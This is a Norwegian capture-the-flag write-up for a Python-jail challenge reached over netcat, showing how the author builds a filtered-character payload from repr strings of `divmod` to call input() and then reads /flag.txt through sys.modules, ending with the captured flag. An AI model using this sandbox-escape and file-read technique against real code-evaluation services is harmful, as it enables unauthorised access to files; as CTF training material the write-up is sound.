# Nissens slemmefengsel

Dessverre har Nissens hjelpere oppdaget at du har jukset i CTF, og du har blitt plassert i Nissens slemmefengsel.

Nissen ønsker likevel å gi deg ett ønske.

```sh
nc nissens-slemmefengsel 1337
```
--------------------------------------------------------------------------

Ser fra challenge at alle bokstaver i 'cybertalent \^_^' er blokkert
Så jeg må prøve å finne en måte å hente ut flagget uten å bruke disse tegnene
Vi er på en veldig gammel versjon av python, så det meste er ikke tilgjengelig...

Tilgjengelig:
```
d, f, g, h, i, j, k, m, o, p, q, s, u, v, w, x, z
0-9
backticks `
parantes ()
brackets []
pluss +
minus -
asterisk *
quotes '"
punktum .
komma ,
kolon :
etc.
```
Fant ut ved å kjøre programmet lokalt at jeg kunne få ut <built-in function 'builtin.function'> ved å lese \`function\`.\
Sjekket hva jeg hadde tilgjengelig av funksjoner, og eneste som ikke ble truffet av filteret var 'divmod', og ved hjelp av dette fikk jeg også brukt dette:\
`divmod` -> '<built-in function 'builtin.divmod'>'\
`divmod`[1] = 'b'\
`divmod`[2] = 'u'\
`divmod`[3] = 'i'\
`divmod`[4] = 'l'\
`divmod`[5] = 't'\
`divmod`[8] = 'n'\
`0.00001`[1] = 'e'  ('1e-05')

Innså tidlig at det var lite sannsynlig at jeg kunne skrive noe for å lese selve flagget, men input() burde gå fint.\
Hvis jeg får en input()-prompt trenger jeg ikke tenke på tegn som ikke er lov.

Jeg kan bruke substrings, to chars kortere enn om jeg ikke gjør det, og `divmod`[7:9] er "in"\
`divmod`[7:9]+'pu'+`divmod`[5]+'()'

Så var det bare å teste meg litt frem før jeg fant ut hvordan jeg åpner /flag.txt og leser det ut.

```sh
login@corax ~/2_oppdrag/2.13_Nissens_slemmefengsel $ nc nissens-slemmefengsel 1337
Dessverre har Nissens hjelpere oppdaget at du har jukset
i CTF, og du har blitt plassert i Nissens slemmefengsel.

Nissen ønsker likevel å gi deg ett ønske.

Skriv inn ønskelisten din: `divmod`[7:9]+'pu'+`divmod`[5]+'()'
sys.stderr.write(sys.modules['builtin'].open('/flag.txt', 'r').readline())
558836ccc367ea98ba2655907d285fad
Nissen har mottatt ønskelisten din
```

login@corax ~/2_oppdrag/2.13_Nissens_slemmefengsel $ scoreboard 558836ccc367ea98ba2655907d285fad

2.13.1 Nissens slemmefengsel\
Da ble det gaver i år likevel!
